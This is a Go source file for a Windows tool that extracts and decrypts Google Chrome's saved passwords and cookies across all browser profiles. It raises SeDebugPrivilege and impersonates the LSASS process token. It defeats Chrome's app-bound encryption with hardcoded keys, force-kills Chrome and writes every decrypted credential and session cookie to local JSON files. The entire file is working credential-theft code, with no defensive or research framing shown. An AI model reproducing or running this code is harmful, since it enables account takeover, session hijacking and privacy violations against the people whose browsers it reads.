package credentials

import (
	"crypto/aes"
	"crypto/cipher"
	"database/sql"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"syscall"
	"time"
	"unsafe"

	_ "github.com/mattn/go-sqlite3"
	"golang.org/x/sys/windows"
)

// Windows API structures and constants
const (
	TOKEN_DUPLICATE          = 0x0002
	TOKEN_IMPERSONATE        = 0x0004
	TOKEN_QUERY              = 0x0008
	SECURITY_IMPERSONATION   = 2
	TOKEN_TYPE_IMPERSONATION = 2
	SE_PRIVILEGE_ENABLED     = 0x00000002
	NCRYPT_PAD_PKCS1_FLAG    = 0x00000002
	NCRYPT_SILENT_FLAG       = 0x00000040
)

var (
	advapi32           = windows.NewLazySystemDLL("advapi32.dll")
	ncrypt             = windows.NewLazySystemDLL("ncrypt.dll")
	crypt32            = windows.NewLazySystemDLL("crypt32.dll")
	
	procOpenProcessToken        = advapi32.NewProc("OpenProcessToken")
	procDuplicateTokenEx        = advapi32.NewProc("DuplicateTokenEx")
	procSetThreadToken          = advapi32.NewProc("SetThreadToken")
	procLookupPrivilegeValue    = advapi32.NewProc("LookupPrivilegeValueW")
	procAdjustTokenPrivileges   = advapi32.NewProc("AdjustTokenPrivileges")
	
	procNCryptOpenStorageProvider = ncrypt.NewProc("NCryptOpenStorageProvider")
	procNCryptOpenKey            = ncrypt.NewProc("NCryptOpenKey")
	procNCryptDecrypt            = ncrypt.NewProc("NCryptDecrypt")
	procNCryptFreeObject         = ncrypt.NewProc("NCryptFreeObject")
	
	procCryptUnprotectData = crypt32.NewProc("CryptUnprotectData")
)

type Cookie struct {
	Host       string `json:"host"`
	Name       string `json:"name"`
	Path       string `json:"path"`
	Expires    string `json:"expires"`
	ExpiresRaw int64  `json:"expires_raw"`
	Secure     bool   `json:"secure"`
	HttpOnly   bool   `json:"httponly"`
	Value      string `json:"value"`
}

type Password struct {
	URL      string `json:"url"`
	Username string `json:"username"`
	Password string `json:"password"`
}

type KeyBlob struct {
	Header           []byte
	Flag             byte
	IV               []byte
	Ciphertext       []byte
	Tag              []byte
	EncryptedAESKey  []byte
}

func chromiumMicrosecondsToTime(ts int64) time.Time {
	if ts <= 0 {
		return time.Time{}
	}
	
	// Chrome uses microseconds since January 1, 1601 (Windows FILETIME epoch)
	// We need to convert to Unix epoch (January 1, 1970)
	
	// Microseconds between 1601-01-01 and 1970-01-01
	const epochDiff int64 = 11644473600000000 // microseconds, not seconds!
	
	// Convert to Unix microseconds
	unixMicros := ts - epochDiff
	
	if unixMicros < 0 {
		return time.Time{}
	}
	
	// Convert to seconds and nanoseconds
	secs := unixMicros / 1_000_000
	nsecs := (unixMicros % 1_000_000) * 1000
	
	return time.Unix(secs, nsecs)
}

func formatChromiumTime(ts int64) string {
	if ts <= 0 {
		return "Never"
	}
	t := chromiumMicrosecondsToTime(ts)
	if t.IsZero() {
		return "Never"
	}
	// Format as "YYYY-MM-DD HH:MM:SS" in local time
	return t.Local().Format("2006-01-02 15:04:05")
}

func isAdmin() bool {
	var sid *windows.SID
	err := windows.AllocateAndInitializeSid(
		&windows.SECURITY_NT_AUTHORITY,
		2,
		windows.SECURITY_BUILTIN_DOMAIN_RID,
		windows.DOMAIN_ALIAS_RID_ADMINS,
		0, 0, 0, 0, 0, 0,
		&sid)
	if err != nil {
		return false
	}
	defer windows.FreeSid(sid)
	
	token := windows.Token(0)
	member, err := token.IsMember(sid)
	if err != nil {
		return false
	}
	return member
}

func enableDebugPrivilege() error {
	var token windows.Token
	err := windows.OpenProcessToken(windows.CurrentProcess(), windows.TOKEN_ADJUST_PRIVILEGES|windows.TOKEN_QUERY, &token)
	if err != nil {
		return fmt.Errorf("OpenProcessToken failed: %w", err)
	}
	defer token.Close()
	
	var luid windows.LUID
	privilegeName, _ := syscall.UTF16PtrFromString("SeDebugPrivilege")
	ret, _, err := procLookupPrivilegeValue.Call(
		0,
		uintptr(unsafe.Pointer(privilegeName)),
		uintptr(unsafe.Pointer(&luid)),
	)
	if ret == 0 {
		return fmt.Errorf("LookupPrivilegeValue failed: %w", err)
	}
	
	tp := struct {
		PrivilegeCount uint32
		Luid           windows.LUID
		Attributes     uint32
	}{
		PrivilegeCount: 1,
		Luid:           luid,
		Attributes:     SE_PRIVILEGE_ENABLED,
	}
	
	ret, _, err = procAdjustTokenPrivileges.Call(
		uintptr(token),
		0,
		uintptr(unsafe.Pointer(&tp)),
		0,
		0,
		0,
	)
	if ret == 0 {
		return fmt.Errorf("AdjustTokenPrivileges failed: %w", err)
	}
	
	return nil
}

func getLsassToken() (windows.Token, error) {
	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return 0, fmt.Errorf("CreateToolhelp32Snapshot failed: %w", err)
	}
	defer windows.CloseHandle(snapshot)
	
	var pe32 windows.ProcessEntry32
	pe32.Size = uint32(unsafe.Sizeof(pe32))
	
	err = windows.Process32First(snapshot, &pe32)
	if err != nil {
		return 0, fmt.Errorf("Process32First failed: %w", err)
	}
	
	var lsassPID uint32
	for {
		processName := windows.UTF16ToString(pe32.ExeFile[:])
		if processName == "lsass.exe" {
			lsassPID = pe32.ProcessID
			break
		}
		err = windows.Process32Next(snapshot, &pe32)
		if err != nil {
			break
		}
	}
	
	if lsassPID == 0 {
		return 0, fmt.Errorf("lsass.exe not found")
	}
	
	// Try with maximum access first
	processHandle, err := windows.OpenProcess(windows.PROCESS_QUERY_INFORMATION|windows.PROCESS_VM_READ, false, lsassPID)
	if err != nil {
		// Fallback to minimal access
		processHandle, err = windows.OpenProcess(windows.PROCESS_QUERY_LIMITED_INFORMATION, false, lsassPID)
		if err != nil {
			return 0, fmt.Errorf("OpenProcess failed (try running as SYSTEM): %w", err)
		}
	}
	defer windows.CloseHandle(processHandle)
	
	var token windows.Token
	ret, _, err := procOpenProcessToken.Call(
		uintptr(processHandle),
		uintptr(TOKEN_DUPLICATE|TOKEN_IMPERSONATE|TOKEN_QUERY),
		uintptr(unsafe.Pointer(&token)),
	)
	if ret == 0 {
		return 0, fmt.Errorf("OpenProcessToken failed: %w (try running as SYSTEM)", err)
	}
	
	return token, nil
}

func impersonateLsass() (windows.Token, error) {
	err := enableDebugPrivilege()
	if err != nil {
		return 0, err
	}
	
	lsassToken, err := getLsassToken()
	if err != nil {
		return 0, err
	}
	
	var dupToken windows.Token
	ret, _, _ := procDuplicateTokenEx.Call(
		uintptr(lsassToken),
		0,
		0,
		uintptr(SECURITY_IMPERSONATION),
		uintptr(TOKEN_TYPE_IMPERSONATION),
		uintptr(unsafe.Pointer(&dupToken)),
	)
	if ret == 0 {
		return 0, fmt.Errorf("DuplicateTokenEx failed")
	}
	
	ret, _, _ = procSetThreadToken.Call(0, uintptr(dupToken))
	if ret == 0 {
		return 0, fmt.Errorf("SetThreadToken failed")
	}
	
	return dupToken, nil
}

func revertToSelf() {
	procSetThreadToken.Call(0, 0)
}

func dpapiUnprotect(data []byte) ([]byte, error) {
	var outBlob windows.DataBlob
	inBlob := windows.DataBlob{
		Size: uint32(len(data)),
		Data: &data[0],
	}
	
	ret, _, err := procCryptUnprotectData.Call(
		uintptr(unsafe.Pointer(&inBlob)),
		0, 0, 0, 0, 0,
		uintptr(unsafe.Pointer(&outBlob)),
	)
	if ret == 0 {
		return nil, fmt.Errorf("CryptUnprotectData failed: %w", err)
	}
	
	result := make([]byte, outBlob.Size)
	copy(result, unsafe.Slice(outBlob.Data, outBlob.Size))
	windows.LocalFree(windows.Handle(unsafe.Pointer(outBlob.Data)))
	
	return result, nil
}

func ncryptDecrypt(data []byte) ([]byte, error) {
	var hProvider uintptr
	provider := windows.StringToUTF16Ptr("Microsoft Software Key Storage Provider")
	ret, _, _ := procNCryptOpenStorageProvider.Call(
		uintptr(unsafe.Pointer(&hProvider)),
		uintptr(unsafe.Pointer(provider)),
		0,
	)
	if ret != 0 {
		return nil, fmt.Errorf("NCryptOpenStorageProvider failed")
	}
	defer procNCryptFreeObject.Call(hProvider)
	
	var hKey uintptr
	keyName := windows.StringToUTF16Ptr("Google Chromekey1")
	ret, _, _ = procNCryptOpenKey.Call(
		hProvider,
		uintptr(unsafe.Pointer(&hKey)),
		uintptr(unsafe.Pointer(keyName)),
		0, 0,
	)
	if ret != 0 {
		return nil, fmt.Errorf("NCryptOpenKey failed")
	}
	defer procNCryptFreeObject.Call(hKey)
	
	var resultSize uint32
	ret, _, _ = procNCryptDecrypt.Call(
		hKey,
		uintptr(unsafe.Pointer(&data[0])),
		uintptr(len(data)),
		0, 0, 0,
		uintptr(unsafe.Pointer(&resultSize)),
		NCRYPT_SILENT_FLAG,
	)
	if ret != 0 {
		return nil, fmt.Errorf("NCryptDecrypt size query failed")
	}
	
	output := make([]byte, resultSize)
	ret, _, _ = procNCryptDecrypt.Call(
		hKey,
		uintptr(unsafe.Pointer(&data[0])),
		uintptr(len(data)),
		0,
		uintptr(unsafe.Pointer(&output[0])),
		uintptr(resultSize),
		uintptr(unsafe.Pointer(&resultSize)),
		NCRYPT_SILENT_FLAG,
	)
	if ret != 0 {
		return nil, fmt.Errorf("NCryptDecrypt failed")
	}
	
	return output[:resultSize], nil
}

func parseKeyBlob(data []byte) (*KeyBlob, error) {
	if len(data) < 8 {
		return nil, fmt.Errorf("blob too short")
	}
	
	headerLen := binary.LittleEndian.Uint32(data[0:4])
	header := data[4 : 4+headerLen]
	
	contentLen := binary.LittleEndian.Uint32(data[4+headerLen : 8+headerLen])
	offset := 8 + headerLen
	
	if int(headerLen+contentLen+8) != len(data) {
		return nil, fmt.Errorf("blob size mismatch")
	}
	
	blob := &KeyBlob{
		Header: header,
		Flag:   data[offset],
	}
	offset++
	
	switch blob.Flag {
	case 1, 2:
		blob.IV = data[offset : offset+12]
		offset += 12
		blob.Ciphertext = data[offset : offset+32]
		offset += 32
		blob.Tag = data[offset : offset+16]
	case 3:
		blob.EncryptedAESKey = data[offset : offset+32]
		offset += 32
		blob.IV = data[offset : offset+12]
		offset += 12
		blob.Ciphertext = data[offset : offset+32]
		offset += 32
		blob.Tag = data[offset : offset+16]
	default:
		return nil, fmt.Errorf("unsupported flag: %d", blob.Flag)
	}
	
	return blob, nil
}

func xorBytes(a, b []byte) []byte {
	result := make([]byte, len(a))
	for i := range a {
		result[i] = a[i] ^ b[i]
	}
	return result
}

func deriveV20MasterKey(blob *KeyBlob) ([]byte, error) {
	var aesKey []byte
	var gcm cipher.AEAD
	
	switch blob.Flag {
	case 1:
		aesKey, _ = hexDecode("B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787")
		block, err := aes.NewCipher(aesKey)
		if err != nil {
			return nil, err
		}
		gcm, err = cipher.NewGCM(block)
		if err != nil {
			return nil, err
		}
		
	case 2:
		return nil, fmt.Errorf("ChaCha20-Poly1305 not implemented")
		
	case 3:
		xorKey, _ := hexDecode("CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390")
		
		token, err := impersonateLsass()
		if err != nil {
			return nil, err
		}
		defer revertToSelf()
		defer token.Close()
		
		decryptedAESKey, err := ncryptDecrypt(blob.EncryptedAESKey)
		if err != nil {
			return nil, err
		}
		
		aesKey = xorBytes(decryptedAESKey, xorKey)
		block, err := aes.NewCipher(aesKey)
		if err != nil {
			return nil, err
		}
		gcm, err = cipher.NewGCM(block)
		if err != nil {
			return nil, err
		}
	}
	
	ciphertext := append(blob.Ciphertext, blob.Tag...)
	plaintext, err := gcm.Open(nil, blob.IV, ciphertext, nil)
	if err != nil {
		return nil, err
	}
	
	return plaintext, nil
}

func getMasterKey() ([]byte, error) {
	userProfile := os.Getenv("USERPROFILE")
	localStatePath := filepath.Join(userProfile, "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
	
	data, err := os.ReadFile(localStatePath)
	if err != nil {
		return nil, fmt.Errorf("failed to read Local State: %w", err)
	}
	
	var localState map[string]interface{}
	err = json.Unmarshal(data, &localState)
	if err != nil {
		return nil, fmt.Errorf("failed to parse Local State JSON: %w", err)
	}
	
	osCrypt, ok := localState["os_crypt"].(map[string]interface{})
	if !ok {
		return nil, fmt.Errorf("os_crypt not found in Local State")
	}
	
	// Try v20 app-bound key FIRST (newer Chrome versions have both keys)
	encryptedKeyB64, hasAppBound := osCrypt["app_bound_encrypted_key"].(string)
	if hasAppBound {
		fmt.Println("Detected v20 app-bound encryption key")
		
		encryptedKey, err := base64.StdEncoding.DecodeString(encryptedKeyB64)
		if err != nil {
			return nil, fmt.Errorf("failed to decode v20 key: %w", err)
		}
		
		if len(encryptedKey) < 4 || string(encryptedKey[:4]) != "APPB" {
			return nil, fmt.Errorf("invalid app-bound key format")
		}
		
		encryptedKey = encryptedKey[4:] // Remove "APPB" prefix
		
		token, err := impersonateLsass()
		if err != nil {
			return nil, fmt.Errorf("failed to impersonate LSASS (required for v20): %w\nNote: v20 encryption requires SYSTEM privileges", err)
		}
		defer revertToSelf()
		defer token.Close()
		
		systemDecrypted, err := dpapiUnprotect(encryptedKey)
		if err != nil {
			return nil, fmt.Errorf("failed system DPAPI decrypt: %w", err)
		}
		
		revertToSelf()
		
		userDecrypted, err := dpapiUnprotect(systemDecrypted)
		if err != nil {
			return nil, fmt.Errorf("failed user DPAPI decrypt: %w", err)
		}
		
		blob, err := parseKeyBlob(userDecrypted)
		if err != nil {
			return nil, fmt.Errorf("failed to parse key blob: %w", err)
		}
		
		masterKey, err := deriveV20MasterKey(blob)
		if err != nil {
			return nil, fmt.Errorf("failed to derive v20 key: %w", err)
		}
		
		fmt.Println("✓ Using v20 app-bound master key")
		return masterKey, nil
	}
	
	// Fall back to legacy encrypted_key (v10/v11)
	encryptedKeyB64, ok = osCrypt["encrypted_key"].(string)
	if !ok {
		return nil, fmt.Errorf("no encrypted key found (neither encrypted_key nor app_bound_encrypted_key)")
	}
	
	fmt.Println("Detected v10/v11 encryption (legacy) - WARNING: This may not work for v20 encrypted data!")
	
	encryptedKey, err := base64.StdEncoding.DecodeString(encryptedKeyB64)
	if err != nil {
		return nil, fmt.Errorf("failed to decode key: %w", err)
	}
	
	if len(encryptedKey) < 5 || string(encryptedKey[:5]) != "DPAPI" {
		return nil, fmt.Errorf("invalid key format")
	}
	
	encryptedKey = encryptedKey[5:] // Remove "DPAPI" prefix
	
	// Try without impersonation first (works for current user)
	masterKey, err := dpapiUnprotect(encryptedKey)
	if err == nil {
		return masterKey, nil
	}
	
	fmt.Println("Trying with LSASS impersonation...")
	token, err := impersonateLsass()
	if err != nil {
		return nil, fmt.Errorf("failed to impersonate LSASS: %w", err)
	}
	defer revertToSelf()
	defer token.Close()
	
	masterKey, err = dpapiUnprotect(encryptedKey)
	if err != nil {
		return nil, fmt.Errorf("failed to decrypt legacy key: %w", err)
	}
	
	return masterKey, nil
}

func getEncryptionVersion(data []byte) string {
	if len(data) < 3 {
		return "DPAPI"
	}
	prefix := string(data[:3])
	switch prefix {
	case "v10":
		return "v10"
	case "v11":
		return "v11"
	case "v20":
		return "v20"
	default:
		return "DPAPI"
	}
}

func decryptValue(encryptedValue []byte, masterKey []byte, isPassword bool) (string, error) {
	if len(encryptedValue) == 0 {
		return "", nil
	}
	
	version := getEncryptionVersion(encryptedValue)
	
	switch version {
	case "v20":
		if masterKey == nil {
			return "", fmt.Errorf("no master key for v20")
		}
		
		if len(encryptedValue) < 31 {
			return "", fmt.Errorf("encrypted value too short")
		}
		
		iv := encryptedValue[3:15]
		ciphertext := encryptedValue[15 : len(encryptedValue)-16]
		tag := encryptedValue[len(encryptedValue)-16:]
		
		block, err := aes.NewCipher(masterKey)
		if err != nil {
			return "", fmt.Errorf("cipher init failed: %w", err)
		}
		
		gcm, err := cipher.NewGCM(block)
		if err != nil {
			return "", fmt.Errorf("GCM init failed: %w", err)
		}
		
		combined := append(ciphertext, tag...)
		plaintext, err := gcm.Open(nil, iv, combined, nil)
		if err != nil {
			return "", fmt.Errorf("decryption failed: %w", err)
		}
		
		if !isPassword && len(plaintext) > 32 {
			plaintext = plaintext[32:]
		}
		
		return string(plaintext), nil
		
	case "v10", "v11":
		// Try direct DPAPI first
		decrypted, err := dpapiUnprotect(encryptedValue)
		if err == nil {
			return string(decrypted), nil
		}
		
		// Try with impersonation
		token, err := impersonateLsass()
		if err != nil {
			return "", fmt.Errorf("DPAPI failed, cannot impersonate: %w", err)
		}
		defer revertToSelf()
		defer token.Close()
		
		decrypted, err = dpapiUnprotect(encryptedValue)
		if err != nil {
			return "", fmt.Errorf("DPAPI decrypt failed: %w", err)
		}
		
		return string(decrypted), nil
		
	case "DPAPI":
		// Try direct DPAPI first
		decrypted, err := dpapiUnprotect(encryptedValue)
		if err == nil {
			return string(decrypted), nil
		}
		
		// Try with impersonation
		token, err := impersonateLsass()
		if err != nil {
			return "", fmt.Errorf("DPAPI failed, cannot impersonate: %w", err)
		}
		defer revertToSelf()
		defer token.Close()
		
		decrypted, err = dpapiUnprotect(encryptedValue)
		if err != nil {
			return "", fmt.Errorf("DPAPI decrypt failed: %w", err)
		}
		
		return string(decrypted), nil
	}
	
	return "", fmt.Errorf("unknown version: %s", version)
}

func hexDecode(s string) ([]byte, error) {
	result := make([]byte, len(s)/2)
	for i := 0; i < len(s); i += 2 {
		fmt.Sscanf(s[i:i+2], "%02x", &result[i/2])
	}
	return result, nil
}

func extractCookies(profileDir, profileName string, masterKey []byte) error {
	cookieDBPath := filepath.Join(profileDir, "Network", "Cookies")
	
	tempDB := filepath.Join(os.TempDir(), fmt.Sprintf("Cookies_%s.db", profileName))
	input, err := os.Open(cookieDBPath)
	if err != nil {
		return err
	}
	defer input.Close()
	
	output, err := os.Create(tempDB)
	if err != nil {
		return err
	}
	defer output.Close()
	
	_, err = io.Copy(output, input)
	if err != nil {
		return err
	}
	output.Close()
	
	db, err := sql.Open("sqlite3", tempDB)
	if err != nil {
		return err
	}
	defer db.Close()
	defer os.Remove(tempDB)
	
	rows, err := db.Query("SELECT host_key, name, path, expires_utc, is_secure, is_httponly, encrypted_value FROM cookies")
	if err != nil {
		return err
	}
	defer rows.Close()
	
	var cookies []Cookie
	successCount := 0
	failCount := 0
	
	for rows.Next() {
		var host, name, path string
		var expires int64
		var secure, httponly int
		var encryptedValue []byte
		
		err := rows.Scan(&host, &name, &path, &expires, &secure, &httponly, &encryptedValue)
		if err != nil {
			continue
		}
		
		value, err := decryptValue(encryptedValue, masterKey, false)
		if err != nil {
			value = "DECRYPT_FAILED"
			failCount++
			if failCount == 1 {
				fmt.Printf("  First cookie decrypt error: %v\n", err)
				fmt.Printf("  Encryption version: %s, Length: %d\n", getEncryptionVersion(encryptedValue), len(encryptedValue))
			}
		} else {
			successCount++
		}
		
		cookies = append(cookies, Cookie{
			Host:       host,
			Name:       name,
			Path:       path,
			Expires:    formatChromiumTime(expires),
			ExpiresRaw: expires,
			Secure:     secure == 1,
			HttpOnly:   httponly == 1,
			Value:      value,
		})
	}
	
	fmt.Printf("  Cookies: %d succeeded, %d failed\n", successCount, failCount)
	
	outputDir := filepath.Join("chrome", profileName)
	os.MkdirAll(outputDir, 0755)
	
	cookieJSON, err := json.MarshalIndent(cookies, "", "  ")
	if err != nil {
		return err
	}
	
	return os.WriteFile(filepath.Join(outputDir, "cookies.json"), cookieJSON, 0644)
}

func extractPasswords(profileDir, profileName string, masterKey []byte) error {
	loginDBPath := filepath.Join(profileDir, "Login Data")
	
	db, err := sql.Open("sqlite3", "file:"+loginDBPath+"?mode=ro&immutable=1")
	if err != nil {
		return err
	}
	defer db.Close()
	
	rows, err := db.Query("SELECT origin_url, username_value, password_value FROM logins")
	if err != nil {
		return err
	}
	defer rows.Close()
	
	var passwords []Password
	successCount := 0
	failCount := 0
	
	for rows.Next() {
		var url, username string
		var encryptedPassword []byte
		
		err := rows.Scan(&url, &username, &encryptedPassword)
		if err != nil {
			continue
		}
		
		password, err := decryptValue(encryptedPassword, masterKey, true)
		if err != nil {
			password = "DECRYPT_FAILED"
			failCount++
			if failCount == 1 {
				fmt.Printf("  First password decrypt error: %v\n", err)
				fmt.Printf("  Encryption version: %s, Length: %d\n", getEncryptionVersion(encryptedPassword), len(encryptedPassword))
			}
		} else {
			successCount++
		}
		
		passwords = append(passwords, Password{
			URL:      url,
			Username: username,
			Password: password,
		})
	}
	
	fmt.Printf("  Passwords: %d succeeded, %d failed\n", successCount, failCount)
	
	outputDir := filepath.Join("chrome", profileName)
	os.MkdirAll(outputDir, 0755)
	
	passwordJSON, err := json.MarshalIndent(passwords, "", "  ")
	if err != nil {
		return err
	}
	
	return os.WriteFile(filepath.Join(outputDir, "passwords.json"), passwordJSON, 0644)
}

func Run() {
	if !isAdmin() {
		fmt.Println("ERROR: This program must be run as administrator")
		fmt.Println("Right-click the executable and select 'Run as administrator'")
		fmt.Println("\nPress Enter to exit...")
		fmt.Scanln()
		return
	}
	
	fmt.Println("Running with administrator privileges...")
	
	// Check if running as SYSTEM
	token := windows.Token(0)
	windows.OpenProcessToken(windows.CurrentProcess(), windows.TOKEN_QUERY, &token)
	user, _ := token.GetTokenUser()
	sid := user.User.Sid.String()
	isSystem := sid == "S-1-5-18"
	
	if isSystem {
		fmt.Println("✓ Running as SYSTEM")
	} else {
		fmt.Println("⚠ Running as Administrator (not SYSTEM)")
	}
	
	// Kill Chrome
	fmt.Println("\nAttempting to close Chrome...")
	exec.Command("taskkill", "/F", "/IM", "chrome.exe").Run()
	
	userProfile := os.Getenv("USERPROFILE")
	if userProfile == "" {
		// When running as SYSTEM, USERPROFILE might not be set
		// Try to find user directories
		usersDir := "C:\\Users"
		entries, err := os.ReadDir(usersDir)
		if err != nil {
			fmt.Printf("Failed to read Users directory: %v\n", err)
			fmt.Println("\nPress Enter to exit...")
			fmt.Scanln()
			return
		}
		
		// Find the first user directory that has Chrome data
		for _, entry := range entries {
			if !entry.IsDir() || entry.Name() == "Public" || entry.Name() == "Default" {
				continue
			}
			testPath := filepath.Join(usersDir, entry.Name(), "AppData", "Local", "Google", "Chrome", "User Data")
			if _, err := os.Stat(testPath); err == nil {
				userProfile = filepath.Join(usersDir, entry.Name())
				fmt.Printf("Found Chrome user profile: %s\n", entry.Name())
				break
			}
		}
		
		if userProfile == "" {
			fmt.Println("Could not find Chrome user profile")
			fmt.Println("\nPress Enter to exit...")
			fmt.Scanln()
			return
		}
	}
	
	chromeUserData := filepath.Join(userProfile, "AppData", "Local", "Google", "Chrome", "User Data")
	
	fmt.Println("\nGetting master key...")
	masterKey, err := getMasterKey()
	if err != nil {
		fmt.Printf("\n❌ Failed to get master key: %v\n", err)
		fmt.Println("\n=== Troubleshooting ===")
		fmt.Println("1. Chrome v127+ uses v20 encryption requiring SYSTEM privileges")
		fmt.Println("2. Download PsExec: https://live.sysinternals.com/psexec.exe")
		fmt.Println("3. Run as SYSTEM:")
		fmt.Println("\nAlternatively, use NSudo or Task Scheduler to run as SYSTEM")
		fmt.Println("\nPress Enter to exit...")
		fmt.Scanln()
		return
	}
	
	fmt.Println("✓ Master key obtained successfully!")
	
	entries, err := os.ReadDir(chromeUserData)
	if err != nil {
		fmt.Printf("Failed to read Chrome directory: %v\n", err)
		fmt.Println("\nPress Enter to exit...")
		fmt.Scanln()
		return
	}
	
	for _, entry := range entries {
		if !entry.IsDir() {
			continue
		}
		
		name := entry.Name()
		matched, _ := filepath.Match("Profile*", name)
		if name != "Default" && !matched {
			continue
		}
		
		profileDir := filepath.Join(chromeUserData, name)
		profileName := name
		
		fmt.Printf("\nProcessing profile: %s\n", profileName)
		
		if err := extractCookies(profileDir, profileName, masterKey); err != nil {
			fmt.Printf("Cookie extraction failed: %v\n", err)
		} else {
			fmt.Printf("Cookies extracted\n")
		}
		
		if err := extractPasswords(profileDir, profileName, masterKey); err != nil {
			fmt.Printf("Password extraction failed: %v\n", err)
		} else {
			fmt.Printf(" Passwords extracted\n")
		}
	}
	
	fmt.Println("\n=== Extraction complete! ===")
	fmt.Println("Files saved in ./chrome/ directory")
}